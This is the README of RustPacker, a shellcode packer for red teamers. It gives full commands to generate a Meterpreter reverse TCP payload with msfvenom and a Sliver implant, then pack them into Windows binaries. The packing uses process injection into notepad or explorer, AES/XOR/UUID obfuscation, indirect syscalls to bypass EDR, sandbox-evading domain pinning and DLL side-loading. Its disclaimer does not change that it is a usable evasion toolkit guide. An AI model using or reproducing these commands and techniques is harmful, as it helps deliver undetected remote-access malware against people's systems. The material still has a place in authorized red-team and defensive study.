<h1 align="center">
<br>
<img src=img/logo_craiyon.png height="400" border="2px solid #555">
<br>
</h1>

## 🎯 Overview

RustPacker is a template-based shellcode packer designed for penetration testers and red team operators. It converts raw shellcode into Windows executables or DLLs using various injection techniques and evasion methods.

### ✨ Key Features

- **Multiple Injection Templates**: Choose from various injection techniques (CRT, APC, Fibers, etc.)
- **Encryption Support**: XOR, AES-256 encryption, and UUID encoding for payload obfuscation
- **Syscall Evasion**: Indirect syscalls to bypass EDR/AV detection
- **Flexible Output**: Generate both EXE and DLL files
- **Sandbox Evasion**: Domain pinning to prevent detonation in analysis environments
- **Cross-Platform Build**: Works on Linux, Windows, and macOS with Podman or Docker
- **Framework Compatible**: Works with Metasploit, Sliver, and custom shellcode

## 🚀 Quick Start

### Prerequisites

You need **one** of the following container runtimes installed:

| Platform | Podman (Recommended) | Docker |
|----------|---------------------|--------|
| **Linux** | `sudo dnf install podman` or `sudo apt install podman` | [Install Docker Engine](https://docs.docker.com/engine/install/) |
| **Windows** | [Podman Desktop](https://podman-desktop.io/) | [Docker Desktop](https://www.docker.com/products/docker-desktop/) |
| **macOS** | `brew install podman && podman machine init && podman machine start` | [Docker Desktop](https://www.docker.com/products/docker-desktop/) |

### Full Container Mode (Recommended)

No Rust toolchain needed — everything runs inside the container:

```bash
# Clone and build the all-in-one container
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/

podman build -t rustpacker -f Dockerfile
```

Place your shellcode in the `shared/` folder and run:

```bash
# Linux / macOS
podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker \
  -f shared/your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe

# Windows (PowerShell)
podman run --rm -v ${PWD}/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker `
  -f shared/your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe

# Windows (cmd.exe)
podman run --rm -v %cd%/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker ^
  -f shared/your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe
```

The compiled binary is located in `shared/output_<timestamp>/target/x86_64-pc-windows-gnu/release/` with a randomized filename:

```
[+] Source binary has been renamed to: "shared/output_1234567890/target/x86_64-pc-windows-gnu/release/AbCdEfGh.exe"
```

### Create an Alias for Convenience

**Linux / macOS (bash/zsh):**
```bash
alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'

rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
```

**Windows (PowerShell):**
```powershell
function rustpacker { podman run --rm -v "${PWD}/shared:/usr/src/RustPacker/shared:z" rustpacker RustPacker @args }

rustpacker -f shared\payload.raw -i syscrt -e aes -b exe -t explorer.exe
```

### Alternative: Native Mode (Rust toolchain required)

If you already have Rust installed, you can run RustPacker directly. It will **automatically detect** Podman or Docker and use a container for cross-compilation:

```bash
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/
cargo build --release

# Linux / macOS
cargo run -- -f shared/your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe

# Windows (PowerShell)
cargo run -- -f shared\your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe
```

The first run builds the `rustpacker-builder` image (once only). Subsequent runs reuse the cached image and a shared cargo registry volume for fast builds.

## 🖥️ Windows Setup Guide

### Step 1: Install a Container Runtime

**Option A — Podman Desktop (Recommended):**
1. Download and install [Podman Desktop](https://podman-desktop.io/)
2. Launch Podman Desktop and follow the guided setup to initialize a Podman machine
3. Verify installation: `podman --version`

**Option B — Docker Desktop:**
1. Download and install [Docker Desktop](https://www.docker.com/products/docker-desktop/)
2. Enable WSL 2 backend during installation (recommended)
3. Verify installation: `docker --version`

### Step 2: Clone the Repository

```powershell
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker
```

### Step 3: Build the Container Image

```powershell
podman build -t rustpacker -f Dockerfile
```

### Step 4: Generate and Pack Shellcode

```powershell
# Place your shellcode in the shared folder
copy C:\path\to\payload.raw shared\

# Pack with AES encryption and remote thread injection (PowerShell)
podman run --rm -v ${PWD}/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker `
  -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe

# Pack with AES encryption and remote thread injection (cmd.exe)
podman run --rm -v %cd%/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker ^
  -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
```

## 📖 Command Line Options

```
Usage: RustPacker -f <FILE> -b <FORMAT> -i <TEMPLATE> -e <ENCRYPTION> [OPTIONS]

Required:
  -f <FILE>         Path to the raw shellcode file
  -i <TEMPLATE>     Injection template: ntapc, ntcrt, syscrt, wincrt, winfiber, ntfiber, sysfiber, earlycascade
  -e <ENCRYPTION>   Encryption method: xor, aes, uuid
  -b <FORMAT>       Output binary format: exe, dll

Optional:
  -t <PROCESS>      Target process to inject into (default: dllhost.exe, CRT templates only)
  -s <DOMAIN>       Domain pinning: only execute on the specified domain name
  -p <DLL_PATH>     DLL proxying: path to legitimate DLL to proxy, placed in shared/ (requires -b dll, self-injection templates only)
  -o <PATH>         Custom output path for the resulting binary
  -h                Print help
  -V                Print version
```

## 📋 Usage Examples

### Generate Shellcode

**Metasploit (msfvenom):**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f raw -o shared/payload.raw
```

**Sliver:**
```bash
# In Sliver console
generate --mtls 192.168.1.100:443 --format shellcode --os windows --evasion
# Then copy the generated .bin file to the shared/ folder
```

### Packing Examples

> The examples below use the `rustpacker` alias defined in the Quick Start section. Replace it with the full `podman run ...` command if you haven't set up the alias.

**Basic EXE with AES encryption (remote injection into notepad):**
```bash
rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
```

**DLL with XOR encryption (self-injection via APC):**
```bash
rustpacker -f shared/payload.raw -i ntapc -e xor -b dll
```

**Using indirect syscalls (remote injection into explorer):**
```bash
rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
```

**UUID encoding (shellcode hidden as UUID strings):**
```bash
rustpacker -f shared/payload.raw -i ntcrt -e uuid -b exe -t notepad.exe
```

**With domain pinning (only detonates on MYDOMAIN):**
```bash
rustpacker -f shared/payload.raw -i winfiber -e aes -b exe -s MYDOMAIN
```

**Custom output path:**
```bash
rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -o shared/my_binary.exe
```

**DLL proxying (side-loading):**
```bash
# 1. Copy the DLL you want to proxy into the shared/ folder (required for container access)
cp /mnt/c/Windows/System32/version.dll shared/   # from WSL
# or: copy C:\Windows\System32\version.dll shared\  # from Windows

# 2. Proxy version.dll — compatible with self-injection templates only (ntapc, winfiber, ntfiber, sysfiber)
rustpacker -f shared/payload.raw -i ntfiber -e aes -b dll -p shared/version.dll
```

The proxy DLL forwards all exports to the renamed original (`version_orig.dll`) and executes your shellcode on load via `DllMain`. Deploy by placing the proxy DLL alongside the target application with the original DLL renamed (e.g., `version.dll` → `version_orig.dll`).

> **Note:** The `-p` path must be accessible from within the container. Since only `shared/` is volume-mounted, always place the DLL to proxy inside `shared/`.

## 🛠️ Available Templates

### Process Injection Templates

These templates inject shellcode into a remote process. Use `-t <process_name>` to specify the target (default: `dllhost.exe`).

| Template | API Level | Indirect Syscalls | Dynamic API | Description |
|----------|-----------|:-----------------:|:-----------:|-------------|
| `wincrt` | High (Windows-rs) | ❌ | ❌ | CreateRemoteThread via the official Windows crate |
| `ntcrt` | Low (ntapi) | ❌ | ✅ | NtCreateThreadEx via dynamic NT API resolution |
| `syscrt` | Syscall | ✅ | ❌ | NtCreateThreadEx via indirect syscalls |
| `earlycascade` | Low (winapi) | ❌ | ❌ | EarlyCascade injection via shim engine callback hijacking |

### Self-Execution Templates

These templates execute shellcode within the current process. No target process needed.

| Template | API Level | Indirect Syscalls | Dynamic API | Description |
|----------|-----------|:-----------------:|:-----------:|-------------|
| `ntapc` | Low (ntapi) | ❌ | ✅ | Queue APC to current thread via dynamic NT API resolution |
| `winfiber` | High (windows-sys) | ❌ | ❌ | Fiber-based execution via Windows API |
| `ntfiber` | Low (ntapi + windows-sys) | ❌ | ✅ | Fiber-based execution via dynamic NT API resolution |
| `sysfiber` | Syscall (ntapi + windows-sys) | ✅ | ❌ | Fiber-based execution via indirect syscalls |

## 🔒 Detection Evasion

RustPacker implements several evasion techniques:

- **No RWX Memory**: Memory is allocated as RW, written, then re-protected as RX only — never RWX. This eliminates a major behavioral detection signal used by EDR/AV.
- **Dynamic API Resolution** (`nt*` templates): NT API functions are resolved at runtime via `GetProcAddress` with XOR-obfuscated function names (random key per build). This removes suspicious ntdll imports from the PE import table.
- **Indirect Syscalls**: Bypass user-mode hooks (`syscrt`, `sysfiber` templates)
- **Payload Encryption**: XOR encoding, AES-256-CBC encryption, or UUID-based encoding
- **Process Injection**: Hide execution in legitimate processes
- **Domain Pinning**: Only detonate on a specific domain (sandbox evasion)
- **Silent Failures**: No descriptive error messages in the binary — all failures exit silently to avoid IoC string detection
- **Template Variety**: Multiple execution methods to avoid static signatures
- **Rust Compilation**: Native binaries with stripped symbols and LTO

> ⚠️ **Breaking Change**: Since RWX (PAGE_EXECUTE_READWRITE) is no longer used, **self-modifying / dynamic shellcode is not supported**. Only static shellcode payloads are compatible. Most C2 frameworks (Metasploit, Sliver, Cobalt Strike, Havoc) generate static shellcode by default — this should not affect typical usage.

## ⚙️ How It Works

RustPacker uses a two-stage approach:

1. **Assembly (runs on your host):** Reads your shellcode, encrypts it, and generates a complete Rust project from the selected template with all placeholders filled in.
2. **Compilation (runs in a container):** Automatically detects Podman or Docker and cross-compiles the generated project to a Windows PE binary inside a Linux container with mingw. Falls back to local `cargo build` if no container runtime is available.

This means you can work from **any OS** — the heavy lifting (cross-compilation with mingw) always happens inside a reproducible Linux container.

## ⚙️ Local Installation (Without Containers)

If you prefer to compile without containers (Linux only):

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt update && sudo apt upgrade -y
sudo apt install -y libssl-dev librust-openssl-dev musl-tools mingw-w64 cmake libxml2-dev

# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env
rustup target add x86_64-pc-windows-gnu
```

### Build and Run

```bash
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/
cargo run -- -f shared/payload.raw -i ntcrt -e xor -b exe -t explorer.exe
```

> When no container runtime is detected, RustPacker falls back to local compilation automatically.

## 🐳 Why Podman over Docker?

We recommend using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/):
- Rootless containers by default
- No daemon running as root
- Better security isolation

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

1. **Code Review**: Review the codebase for improvements
2. **Issues**: Report bugs or request features
3. **Templates**: Contribute new injection techniques
4. **Documentation**: Improve documentation and examples

### Development Roadmap

- [x] Multiple injection templates
- [x] XOR, AES, and UUID encryption/encoding
- [x] Indirect syscalls support
- [x] EXE and DLL output formats
- [x] Docker containerization
- [x] Domain pinning, thanks to [m4r1u5-p0p](https://github.com/m4r1u5-p0p) !
- [x] Indirect syscalls for fiber templates
- [x] Cross-platform support (Linux, Windows, macOS)
- [ ] String encryption (litcrypt)
- [ ] Check DLL support for all templates
- [x] Add EarlyCascade injection template
- [x] Add DLL proxying support
- prepare integration with mythic c2

## 🙏 Acknowledgments

- [0xNinjaCyclone](https://github.com/0xNinjaCyclone) & [Karkas](https://github.com/Karkas66) - [EarlyCascade injection technique](https://github.com/Karkas66/EarlyCascadeImprooved)
- [memN0ps](https://github.com/memN0ps) - Inspiration and guidance
- [rust-syscalls](https://github.com/janoglezcampos/rust_syscalls) - Syscall implementation
- [trickster0](https://github.com/trickster0) - OffensiveRust repository
- [Maldev Academy](https://maldevacademy.com/) - Fiber execution techniques
- [craiyon](https://www.craiyon.com/) - Logo generation

## 📄 License & Legal Notice

**⚠️ IMPORTANT DISCLAIMER ⚠️**

This tool is provided for **educational and authorized penetration testing purposes only**.

- Usage against targets without prior mutual consent is **illegal**
- Users are responsible for complying with all applicable laws
- Developers assume no liability for misuse or damages
- Only use in authorized environments with proper permission

**Use responsibly and ethically.**

---

<div align="center">

**Made with ❤️ for the cybersecurity community**

[Report Issues](https://github.com/Nariod/RustPacker/issues) • [Contribute](https://github.com/Nariod/RustPacker/pulls) • [Documentation](https://github.com/Nariod/RustPacker/wiki)

</div>